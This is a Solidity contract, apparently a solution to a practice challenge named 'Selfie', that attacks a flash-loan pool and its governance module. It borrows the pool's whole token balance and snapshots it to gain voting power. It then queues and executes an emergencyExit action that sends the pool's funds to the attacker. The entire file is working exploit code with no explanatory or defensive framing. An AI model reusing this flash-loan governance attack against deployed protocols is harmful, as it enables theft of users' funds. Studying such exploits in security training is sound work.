pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../ISimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


interface ISelfie {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

interface IToken {
    function snapshot() external;
}


contract Attack {

    address owner;
    ISimpleGovernance governance;
    ISelfie pool;
    address Stoken;
    uint256 actionId;

    constructor(address _governance, address _pool, address _token) {
        owner = msg.sender;
        governance = ISimpleGovernance(_governance);
        pool = ISelfie(_pool);
        Stoken = _token;
    }

    function attack() public {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), Stoken, ERC20(Stoken).balanceOf(address(pool)), "");
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", address(this)));
    }

    function attack_end() public {
        governance.executeAction(actionId);
        ERC20(Stoken).transfer(owner, ERC20(Stoken).balanceOf(address(this)));
    }

    function onFlashLoan(address initiator,
            address token,
            uint256 amount,
            uint256 fee,
            bytes memory data) 
            external returns (bytes32) {
        
        IToken(token).snapshot();
        ERC20(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }


}